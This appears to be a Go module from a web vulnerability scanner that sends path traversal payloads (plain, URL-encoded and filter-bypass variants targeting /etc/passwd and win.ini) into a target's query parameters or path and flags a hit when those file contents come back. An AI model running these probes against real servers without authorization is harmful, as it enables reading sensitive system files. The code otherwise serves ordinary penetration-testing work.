package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// PathTraversalAttackResult holds the result of the PathTraversalAttack module execution.
type PathTraversalAttackResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// PathTraversalAttack executes the path_traversal_attack security technique.
type PathTraversalAttack struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []PathTraversalAttackResult
	client     *http.Client
}

// NewPathTraversalAttack creates a new instance of PathTraversalAttack.
func NewPathTraversalAttack(target string) *PathTraversalAttack {
	return &PathTraversalAttack{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     NewHTTPClient(10 * time.Second),
	}
}

func (m *PathTraversalAttack) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var traversalPayloads = []string{
	"../../../etc/passwd",
	"..%2f..%2f..%2fetc%2fpasswd",
	"....//....//....//etc/passwd",
	"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
	"../../../../../../../../windows/win.ini",
}

func (m *PathTraversalAttack) Execute(ctx context.Context) ([]PathTraversalAttackResult, error) {
	m.results = make([]PathTraversalAttackResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(traversalPayloads))
	for _, p := range traversalPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *PathTraversalAttack) testPayload(ctx context.Context, u *url.URL, payload string) {
	query := u.Query()
	hasParams := len(query) > 0

	testURL := *u
	if hasParams {
		for key := range query {
			// Replace instead of append for path traversal, to trick file fetchers
			query.Set(key, payload)
		}
		testURL.RawQuery = query.Encode()
	} else {
		// Or try it in the path
		testURL.Path = testURL.Path + "/" + payload
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := string(bodyBytes)

	// Check for common /etc/passwd output or win.ini output
	if strings.Contains(bodyStr, "root:x:0:0:") || strings.Contains(strings.ToLower(bodyStr), "[extensions]") {
		m.mu.Lock()
		m.results = append(m.results, PathTraversalAttackResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Path traversal successful with payload: " + payload,
		})
		m.mu.Unlock()
	}
}
